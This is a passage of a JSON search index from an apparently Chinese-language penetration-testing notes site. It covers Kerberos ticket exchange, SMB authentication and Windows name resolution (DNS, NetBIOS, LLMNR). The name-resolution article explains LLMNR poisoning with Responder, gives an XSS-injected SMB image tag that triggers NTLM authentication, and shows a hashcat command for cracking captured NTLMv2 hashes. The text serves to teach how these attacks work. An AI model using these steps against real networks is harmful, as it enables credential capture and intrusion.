key","title":"ASREP"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#tgsreq","text":"1.ap-req->\u2026->tikect: \u53ef\u4ee5\u53d1\u73b0TGSREQ\u628a\u6574\u4e2aTGT\u53d1\u9001\u7ed9\u4e86TGS 2ap-req->\u2026->authenticator:\u88ablogin session key\u52a0\u5bc6\u7684\u65f6\u95f4\u6233\u548cclient id","title":"TGSREQ"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#tgsrep","text":"1.tikect:\u8fd9\u91cc\u5c31\u662fTGS\u90e8\u5206\u4e86\u3002 enc-part\uff1a\u8fd9\u91cc\u7684enc-part\u662f\u88ab\u6240\u8bf7\u6c42\u7684\u670d\u52a1\u7684\u7528\u6237hash\u52a0\u5bc6\u7684 2.enc-part:\u88ablogin session key\u52a0\u5bc6\u7684service session key","title":"TGSREP"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#smb","text":"SMB\u534f\u8bae\u662f\u4e00\u4e2a\u7528\u4e8e\u4e24\u53f0\u8ba1\u7b97\u673a\u95f4\u5171\u4eab\u6587\u4ef6 \u3001\u6253\u5370\u673a\u3001\u4e32\u53e3\u7b49\u529f\u80fd\u7684\u534f\u8bae\u3002 \u7f51\u4e0a\u90bb\u5c45\u529f\u80fd\u5c31\u662f\u4f9d\u9760SMB\u534f\u8bae\u800c\u8d77\u7684\u3002 \u901a\u8fc7smb\u534f\u8bae\uff0c\u4e00\u53f0\u8ba1\u7b97\u673a\u53ef\u4ee5\u5728\u7ecf\u8fc7smb\u8ba4\u8bc1\u540e\u8bfb\u5199\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u7684\u4e00\u4e9b\u6587\u4ef6\u3002 smb\u534f\u8bae\u4e00\u822c\u67b6\u8bbe\u5728NetBios\u534f\u8bae\u4e4b\u4e0a\u3002 NetBIOS \u4f7f\u7528\u4e0b\u5217\u7aef\u53e3\uff1aUDP/137\uff08NetBIOS \u540d\u79f0\u670d\u52a1\uff09\u3001UDP/138\uff08NetBIOS \u6570\u636e\u62a5\u670d\u52a1\uff09\u3001TCP/139\uff08NetBIOS \u4f1a\u8bdd\u670d\u52a1\uff09\uff1bSMB \u4f7f\u7528\u4e0b\u5217\u7aef\u53e3\uff1aTCP/139\u3001TCP/445\u3002","title":"SMB\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#smb_1","text":"\u5982\u679c\u6211\u4eec\u60f3\u4f9d\u9760smb\u534f\u8bae\u53bb\u8bfb\u5199\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u5176\u4e2d\u7684SMB\u8ba4\u8bc1\u60c5\u51b5\u662f\u5982\u4f55\u5462\uff1f\u6211\u4eec\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u3002 1.\u7248\u672c\u786e\u7acb\u9636\u6bb5 2.\u7528\u6237\u8ba4\u8bc1\u9636\u6bb5 3.\u8d44\u6e90\u94fe\u63a5\u9636\u6bb5 4.\u8d44\u6e90\u8bfb\u5199\u9636\u6bb5 \u66f4\u8be6\u7ec6\u4e00\u70b9\u3002 1.\u7248\u672c\u786e\u7acb\u9636\u6bb5\u3002\u5ba2\u6237\u7aef\u5148\u53d1\u9001\u81ea\u5df1\u652f\u6301\u7684SMB\u534f\u8bae\u7248\u672c\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u6536\u5230\u540e\u5411\u5ba2\u6237\u7aef\u5217\u51fa\u5e0c\u671b\u4f7f\u7528\u7684\u7248\u672c\u3002\u82e5\u5ba2\u6237\u7aef\u652f\u6301\u7684smb\u7248\u672c\u670d\u52a1\u5668\u5747\u4e0d\u652f\u6301\uff0c\u5219\u8fd4\u56de 0XFFFFH\uff0c\u7ed3\u675f\u901a\u4fe1 \u3002 2.\u7528\u6237\u8ba4\u8bc1\u9636\u6bb5\u3002\u786e\u7acb\u597d\u8ba4\u8bc1\u7248\u672c\u540e\uff0c\u5c31\u662f\u5ba2\u6237\u7aef\u53d1\u9001\u8d26\u6237\u5bc6\u7801\u7ed9\u670d\u52a1\u7aef\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e86\u3002\u670d\u52a1\u5668\u6536\u5230\u540e\u8fd4\u56de\u8ba4\u8bc1\u6210\u529f\u6216\u5931\u8d25 3.\u8d44\u6e90\u94fe\u63a5\u9636\u6bb5\u3002\u7528\u6237\u8ba4\u8bc1\u901a\u8fc7\u540e\uff0c\u5ba2\u6237\u7aef\u53d1\u9001\u81ea\u5df1\u60f3\u8981\u8bbf\u95ee\u7684\u8d44\u6e90\u540d\uff0c\u670d\u52a1\u5668\u6536\u5230\u540e\u8fd4\u56de\u5141\u8bb8\u6216\u62d2\u7edd 4.\u8d44\u6e90\u8bfb\u5199\u9636\u6bb5\uff0c\u5ba2\u6237\u7aef\u5f00\u59cb\u8bfb\u5199\u670d\u52a1\u5668\u4e0a\u6587\u4ef6\u3002 \u770b\u8d77\u6765\u6bd4ntlm\u548ckerberos\u7b80\u5355\u591a\u4e86\u3002\u6293\u5305\u5206\u6790\u4e00\u4e0b\u3002","title":"SMB\u8ba4\u8bc1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_10","text":"1.1 \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u7aef\u5217\u51fa\u5f53\u524d\u652f\u6301\u7684smb\u7248\u672c 1.2\u670d\u52a1\u5668\u8fd4\u56de\u5e0c\u671b\u7684SMB\u7248\u672c 1.3\u8fd9\u91cc\u8bf4\u4e2a\u9898\u5916\u8bdd\uff0c\u6b64\u65f6\u670d\u52a1\u5668\u53ea\u662f\u9009\u4e2d\u4e86SMB2\uff0c\u4f46\u662fSMB2\u4e5f\u5206\u4e86\u5f88\u591a\u7248\u672c\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u8fd8\u4f1a\u57fa\u4e8eSMB2\u7ee7\u7eed\u8fdb\u884c\u7248\u672c\u95ee\u8be2 \u7136\u540e\u670d\u52a1\u5668\u518d\u7ee7\u7eed\u9009\u62e9\u4e00\u4e2a\u7ec6\u5206\u7248\u672c\uff0c\u7248\u672c\u534f\u5546\u7ed3\u675f 2.1 \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u7aef\u63d0\u4f9b\u7528\u6237\u4fe1\u606f\u3002SMB\u534f\u8bae\u7684\u8fd9\u4e00\u4e2a\u90e8\u5206\u4f7f\u7528NTLM\u534f\u8bae\u5b8c\u6210\u7684\u3002\u5efa\u8bae\u5148\u770b\u770bNTLM\u8ba4\u8bc1\u518d\u8fc7\u6765 \u9996\u5148\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42NTLM\u8ba4\u8bc1\u7684\u5305 2.2\u670d\u52a1\u7aef\u8fd4\u56dechallenge 2.3 \u5ba2\u6237\u7aef\u53d1\u9001\u7528\u6237\u540d\uff0c\u88abclient hash\u52a0\u5bc6\u7684challenge\uff08NTLM RESPONSE\uff09\u7ed9\u670d\u52a1\u7aef 2.4\u670d\u52a1\u7aef\u8fdb\u884c\u8ba4\u8bc1\u5904\u7406\uff0c\u8fd4\u56de\u8ba4\u8bc1\u6210\u529f\u6216\u5931\u8d25\uff0c\u4e0b\u56fe\u662f\u6210\u529f\u65f6\uff0c\u8fd4\u56de \u4f1a\u8bdd\u5efa\u7acb\u5b57\u6837 3.1\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u7684\u8d44\u6e90 3.2\u670d\u52a1\u7aef\u8fd4\u56de\u5141\u8bb8\u6216\u62d2\u7edd \u5404\u79cd\u8bfb\u5199\u64cd\u4f5c\u8bf7\u6c42","title":"\u6293\u5305\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#tips","text":"\u4e00\u4e2a\u8ba1\u7b97\u673a\u52a0\u5165\u57df\u540e\uff0c\u5b83\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u5c06\u4f1a\u88ab\u7981\u7528\u3002 \u5728\u5df2\u52a0\u5165\u57df\u7684\u4e3b\u673a\u767b\u5f55\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u8f93\u5165\u6b63\u786e\u5bc6\u7801\u540e\u4f1a\u63d0\u793a\u8d26\u6237\u7981\u7528","title":"TIPS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","text":"Windows\u540d\u79f0\u89e3\u6790\u4e0e\u76f8\u5e94\u653b\u51fb\u65b9\u6cd5 \u76ee\u5f55 \u540d\u79f0\u89e3\u6790\u7684\u4e3b\u8981\u534f\u8bae DNS \u5de5\u4f5c\u673a\u7406 NETBIOS \u5de5\u4f5c\u673a\u7406\uff08H-\u8282\u70b9\uff09 \u8282\u70b9\u7c7b\u578b LLMNR \u5de5\u4f5c\u673a\u7406 \u9488\u5bf9\u540d\u79f0\u89e3\u6790\u7684\u653b\u51fb\u65b9\u6cd5 LLMNR \u6295\u6bd2 SMB\u7206\u7834hash \u540d\u79f0\u89e3\u6790\u7684\u4e3b\u8981\u534f\u8bae DNS dns\u534f\u8bae\u652f\u6301IPV4,IPV6,DNS\u670d\u52a1\u5668DNS\u670d\u52a1\u7684\u76d1\u542c\u7aef\u53e3\u662fUDP/53\u3002 \u5de5\u4f5c\u673a\u7406 1.\u8bfb\u53d6\u672c\u673a\u7684DNS\u7f13\u5b58\uff0c\u5373HOST\u6587\u4ef6\u6765\u8fdb\u884cDNS\u540d\u79f0\u89e3\u6790 2.\u82e5\u672c\u5730\u6ca1\u6709\u5bf9\u5e94\u7684\u540d\u79f0\u8bb0\u5f55\uff0c\u5219\u8bf7\u6c42\u7f51\u7edc\u914d\u7f6e\u7684DNS\u670d\u52a1\u5668 3.\u82e5DNS\u670d\u52a1\u5668\u4e5f\u6ca1\u6709\u5bf9\u5e94\u54cd\u5e94\uff0c\u5219DNS\u8d28\u8be2\u5931\u8d25\u3002 NETBIOS netbois \u76d1\u542c\u7aef\u53e3\u4e3a UDP/137,\u5b83\u4e0d\u652f\u6301IPV6\uff0c\u5b83\u4e0eDNS\u7684\u4e0d\u540c\u662f\u5b83\u9664\u4e86\u901a\u8fc7\u7279\u5b9a\u670d\u52a1\u5668\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5e7f\u64ad\u6765\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u3002 \u5de5\u4f5c\u673a\u7406\uff08H-\u8282\u70b9\uff09 1.\u68c0\u67e5\u672c\u5730NetBois\u7f13\u5b58\uff0c\u6709\u7f13\u5b58\u5219\u5b8c\u6210\u540d\u79f0\u89e3\u6790\u3002\uff08\u4f7f\u7528nbtstat -c\u547d\u4ee4\u67e5\u770b\u672c\u673a\u7684 NetBIOS \u7f13\u5b58\uff09 2.\u82e5\u65e0\u7f13\u5b58\uff0c\u4e14\u914d\u7f6e\u4e86WINS\u670d\u52a1\u5668\uff0c\u5219\u901a\u8fc7WINS\u670d\u52a1\u5668\u6765\u8fdb\u884c\u540d\u79f0\u89e3\u6790\uff08\u548cDNS\u670d\u52a1\u5668\u5f88\u50cf\uff09 3.\u82e5\u6ca1\u6709WINS\u670d\u52a1\u5668\u6216\u8005WINS\u670d\u52a1\u5668\u65e0\u54cd\u5e94\uff0c\u5219\u5411\u5f53\u524d\u7f51\u6bb5\u53d1\u9001\u5e7f\u64ad\u8fdb\u884c\u8d28\u8be2\uff08\u548cARP\u6709\u70b9\u50cf\uff09\uff0c\u82e5\u6709\u4e3b\u673a\u54cd\u5e94\u5219\u5b8c\u6210\u540d\u79f0\u89e3\u6790 4.\u82e5\u5e7f\u64ad\u540e\u65e0\u4efb\u4f55\u4e3b\u673a\u54cd\u5e94\uff0c\u5219\u8bfb\u53d6\u672c\u5730Imhosts\u6587\u4ef6\uff0c\u5176\u5b58\u5728\u4e8eC:\\Windows\\System32\\drivers\\etc\\\uff0c\uff08\u548cDNS\u672c\u5730\u67e5\u8be2\u5f88\u50cf\uff09 \u8282\u70b9\u7c7b\u578b NETBIOS\u7684\u5b9e\u9645\u5de5\u4f5c\u60c5\u51b5\u5e76\u4e0d\u662f\u50cf\u521a\u521a\u8bf4\u7684\u90a3\u4e48\u6b7b\u677f\uff0c\u5b9e\u9645\u4e0a\uff0cNETBIOS\u540d\u79f0\u89e3\u6790\u6709\u56db\u79cd\u4e0d\u540c\u7684\u5de5\u4f5c\u987a\u5e8f. B-\u8282\u70b9(broadcast\uff0c\u5e7f\u64ad) \u5f53 Windows \u5c1d\u8bd5\u89e3\u6790\u540d\u79f0\u65f6\uff0c\u9996\u5148\u68c0\u67e5 NetBois\u7f13\u5b58\uff0c\u5982\u679c\u6b64\u884c\u4e0d\u901a\uff0cWindows \u5c31\u4f1a\u53d1\u9001\u5e7f\u64ad\uff0c\u5982\u679c\u5e7f\u64ad\u4f9d\u7136\u5931\u8d25\u7684\u8bdd\uff0c\u90a3Windows \u624d\u4f1a\u68c0\u67e5\u5b9e\u9645\u7684 LMHOSTS \u6587\u4ef6\u3002 P-\u8282\u70b9(per-to-per\uff0c\u5bf9\u7b49) \u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u4f7f\u7528\u5e7f\u64ad\uff0c\u800c\u662f\u5728\u8ba1\u7b97\u673a\u542f\u52a8\u65f6\uff0c\u5728\u7f51\u7edc\u4e2d\u7684 WINS \u670d\u52a1\u5668\u4e0a\u6ce8\u518c\u5b83\u4eec\u7684\u540d\u79f0\uff0c\u5f53\u8ba1\u7b97\u673a\u9700\u8981\u89e3\u6790\u540d\u79f0\u65f6\uff0c\u5b83\u4f1a\u53d1\u9001\u4e00\u4e2a\u89e3\u6790\u8bf7\u6c42\u7ed9 WINS \u670d\u52a1\u5668\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ea\u5728 WINS \u670d\u52a1\u5668\u6b63\u5e38\u8fd0\u884c\u65f6\u6709\u6548\uff0c\u5982\u679c WINS \u670d\u52a1\u5668\u5931\u8d25\uff0c\u5219\u65e0\u6cd5\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u3002 M-\u8282\u70b9(mixed\uff0c\u6df7\u5408) Windows \u8054\u5408\u4f7f\u7528 B \u8282\u70b9\u548c P \u8282\u70b9\uff0c\u5e76\u4e14\u9ed8\u8ba4\u4f7f\u7528 B \u8282\u70b9\uff0c\u5982\u679c M \u8282\u70b9\u4e0d\u80fd\u5229\u7528\u5e7f\u64ad\u8fdb\u884c\u540d\u79f0\u89e3\u6790\uff0c\u5b83\u5c31\u4f7f\u7528 P \u8282\u70b9\u7684 WINS \u670d\u52a1\u5668\u6765\u5b8c\u6210\u5de5\u4f5c\u3002 H-\u8282\u70b9(hybrid\uff0c\u6df7\u5408) \u540c\u6837\u4e5f\u662f\u8054\u5408\u4f7f\u7528 B \u8282\u70b9\u548c P \u8282\u70b9\uff0c\u4f46\u5de5\u4f5c\u65b9\u5f0f\u76f8\u53cd\uff0c\u5982\u679c\u4f7f\u7528 WINS \u670d\u52a1\u5668\u65b9\u5f0f\u4e0d\u80fd\u6210\u529f\uff0c\u5219\u4f7f\u7528 B \u8282\u70b9\u7684\u5de5\u4f5c\u6765\u5b8c\u6210\u5de5\u4f5c\u3002\u6b64\u8282\u70b9\u6a21\u5f0f\u4e5f\u662f \u76ee\u524d Windows \u7cfb\u7edf\u9ed8\u8ba4\u4f7f\u7528\u7684\u8282\u70b9\u6a21\u5f0f \u3002 \u8282\u70b9\u6a21\u5f0f\u53ef\u4ee5\u5728ipconfig /all \u7684\u8282\u70b9\u7c7b\u578b\u5904\u770b\u5230\u3002 LLMNR LLMNR\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u72ec\u7acb\u670d\u52a1\u5668 ,\u5b83\u4ec5\u9760\u591a\u64ad\u6765\u5b9e\u73b0\u540d\u79f0\u89e3\u6790\u3002\u5b83\u518dWindows Vista\u7248\u672c\u4e4b\u540e\u51fa\u73b0\u3002 \u5b83\u53c8\u88ab\u79f0\u4f5c\u201c\u591a\u64adDNS\u201d\uff0c\u76d1\u542c\u7aef\u53e3\u4e3a UDP/5355 \u5de5\u4f5c\u673a\u7406 1.\u68c0\u67e5NetBios\u7f13\u5b58\u3002 2.\u82e5\u65e0\u7f13\u5b58\uff0c\u5219\u5411\u5f53\u524d\u7f51\u57df\u53d1\u9001\u5e7f\u64ad\u3002 3.\u82e5\u6709\u4e3b\u673a\u54cd\u5e94\uff0c\u5219\u89e3\u6790\u6210\u529f\u3002\u53cd\u4e4b\u5219\u4e0d\u6210\u529f\u3002 \u9488\u5bf9\u540d\u79f0\u89e3\u6790\u7684\u653b\u51fb\u65b9\u6cd5 LLMNR \u6295\u6bd2 \u4e0b\u56fe\u4e3aLLMNR\u7684\u6b63\u5e38\u6d41\u7a0b \u88ab\u6bd2\u5316\u540e \u5b9e\u9645\u4e0aLLMNR\u6295\u6bd2\u5e76\u4e0d\u590d\u6742\uff0c\u65e0\u975e\u5c31\u662f\u5e94\u7b54LLMNR\u8bf7\u6c42\u5305\u4ece\u800c\u5192\u5145\u81ea\u5df1\u4e3a\u53e6\u4e00\u53f0\u4e3b\u673a\u3002 \u5728\u5185\u7f51\u73af\u5883\u4e2d\u8bf8\u591a\u540d\u79f0\u89e3\u6790\u670d\u52a1\u90fd\u662f\u901a\u8fc7DNS\u5b8c\u6210\u7684\uff0c\u53ea\u6709\u5c11\u6570\u5982SMB\u5171\u4eab\u548cping\u8fd8\u6709\u8fdc\u7a0b\u8fde\u63a5\uff08win10\u4f1a\u5148\u901a\u8fc7DNS\u8fdb\u884c\u89e3\u6790\uff0cDNS\u89e3\u6790\u5931\u8d25\u624d\u4f1a\u4f7f\u7528LLMNR\uff09\u4f1a\u4f7f\u7528LLMNR\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u3002 smb\u8bf7\u6c42\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684smb\u5730\u5740\uff0c\u89e6\u53d1LLMNR\u540d\u79f0\u89e3\u6790(win10) \u8fdc\u7a0b\u8fde\u63a5\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u4e3b\u673a\uff0c\u89e6\u53d1LLMNR\u540d\u79f0\u89e3\u6790\uff08WIN10 LLMNR\u6295\u6bd2\u7684\u4e3b\u8981\u653b\u51fb\u65b9\u5f0f\u5c31\u662f\u901a\u8fc7\u5728\u67d0\u4e00\u673a\u5668\u53d1\u8d77SMB\u8bf7\u6c42\u65f6\u8fdb\u884c\u5192\u5145\uff0c\u622a\u83b7\u76ee\u6807\u5728SMB\u901a\u4fe1\u4e2d\u53d1\u9001\u7684hash\u5e76\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ece\u800c\u83b7\u53d6\u7528\u6237\u7684\u5bc6\u7801hash\u3002 \u6216\u8005\u5192\u5145WEB\u670d\u52a1\u5668\u8fdb\u884c\u9493\u9c7c\uff08\u7531\u4e8e\u76ee\u524dLLMNR\u89e3\u6790\u5f80\u5f80\u53ea\u7528\u4e8eSMB\u548cICMP\u8fd8\u6709RDP\uff0c\u6240\u4ee5\u4e0eHTTP\u6cbe\u8fb9\u7684\u65b9\u6cd5\u5f88\u96be\u7528\u5230\uff09\u3002 SMB\u7206\u7834hash \u6211\u4eec\u6709\u5fc5\u8981\u4e86\u89e3\u4e00\u4e0b\uff0cSMB\u7684\u5de5\u4f5c\u673a\u5236\u3002 \u5b9e\u9645\u4e0aSMB\u5728\u786e\u8ba4\u5bf9\u65b9\u8eab\u4efd\u65f6\uff0c\u7528\u7684\u662fNTLM\u534f\u8bae\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7xss\u5411\u4e00\u4e2aweb\u9875\u9762\u4e2d\u63d2\u5165\u50cf\u8fd9\u6837\u7684\u4ee3\u7801 <img src=\\\\test\\1.jpg> \u5176\u4e2dtest\u8fd9\u4e00\u4e2aSMB\u540d\u79f0\u5b9e\u9645\u4e0a\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u6545\u8bbf\u95ee\u8be5\u9875\u9762\u7684\u4e3b\u673a\u4f1a\u901a\u8fc7LLMNR\u53bb\u5e7f\u64ad\u89e3\u6790\u8fd9\u4e2a\u540d\u79f0\u5bf9\u5e94\u7684IP\u3002\u6211\u4eec\u8fd9\u4e2a\u65f6\u5019\u5c06\u5176\u52ab\u6301\uff0c\u56de\u5e94\u8bf4\u81ea\u5df1\u4fbf\u662ftest\uff0c\u63a5\u4e0b\u6765\u5c31\u4f1a\u8fdb\u5165\u5230SMB\u7684\u8eab\u4efd\u9a8c\u8bc1\u73af\u8282\uff1a\u6211\u4eec\u5411\u53d1\u9001SMB\u8bf7\u6c42\u7684\u673a\u5668\u53d1\u9001\u4e00\u4e2achallenge\uff0c\u5bf9\u65b9\u4fbf\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5176\u7528\u81ea\u5df1HASH\u52a0\u5bc6\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32response\uff08\u4e5f\u5c31\u662fNTLMv2\uff09\u8fc7\u6765\u3002\u6211\u4eec\u62ff\u5230response\u540e\u901a\u8fc7\u7206\u7834\u5de5\u5177\u8fdb\u884c\u7206\u7834\u5176\u5bc6\u94a5\uff0c\u4fbf\u6709\u7206\u7834\u51fa\u5176CLIENT HASH\u7684\u53ef\u80fd\u6027\u3002 \u6211\u4eec\u7528responder\u8fdb\u884c\u6bd2\u5316\uff0c\u5728\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684SMB\u8def\u5f84\u65f6\u8fdb\u884cLLMNR\u5e94\u7b54\uff0c\u53d1\u9001challenge\uff1a1122334455667788\u5e76\u622a\u83b7\u5176NTLMv2 \u968f\u540e\u5c06NTLMv2-SSP HASH\u590d\u5236\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5c06\u7206\u7834\u7684\u5bc6\u7801\u5217\u8868\u653e\u5165\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u3002 hashcat -m 5600 hash.txt password.txt \u6210\u529f\u7206\u7834\u51fa","title":"Windows\u540d\u79f0\u89e3\u6790\u4e0e\u76f8\u5e94\u653b\u51fb\u65b9\u6cd5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#windows","text":"","title":"Windows\u540d\u79f0\u89e3\u6790\u4e0e\u76f8\u5e94\u653b\u51fb\u65b9\u6cd5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#_1","text":"\u540d\u79f0\u89e3\u6790\u7684\u4e3b\u8981\u534f\u8bae DNS \u5de5\u4f5c\u673a\u7406 NETBIOS \u5de5\u4f5c\u673a\u7406\uff08H-\u8282\u70b9\uff09 \u8282\u70b9\u7c7b\u578b LLMNR \u5de5\u4f5c\u673a\u7406 \u9488\u5bf9\u540d\u79f0\u89e3\u6790\u7684\u653b\u51fb\u65b9\u6cd5 LLMNR \u6295\u6bd2 SMB\u7206\u7834hash","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#_2","text":"","title":"\u540d\u79f0\u89e3\u6790\u7684\u4e3b\u8981\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#dns","text":"dns\u534f\u8bae\u652f\u6301IPV4,IPV6,DNS\u670d\u52a1\u5668DNS\u670d\u52a1\u7684\u76d1\u542c\u7aef\u53e3\u662fUDP/53\u3002","title":"DNS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#_3","text":"1.\u8bfb\u53d6\u672c\u673a\u7684DNS\u7f13\u5b58\uff0c\u5373HOST\u6587\u4ef6\u6765\u8fdb\u884cDNS\u540d\u79f0\u89e3\u6790 